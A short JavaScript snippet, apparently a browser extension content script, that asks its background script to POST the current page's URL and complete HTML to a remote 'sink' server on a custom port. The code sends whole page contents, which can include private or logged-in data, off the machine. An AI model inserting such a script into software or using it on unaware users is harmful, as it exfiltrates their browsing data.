chrome.runtime.sendMessage({
    method: 'POST',
    action: 'xhttp',
    url: 'http://sink.raidancampbell.com:60606/api/v1/visit/' + window.location.href,
    data: document.head.innerHTML + document.body.innerHTML
}, function(responseText) {});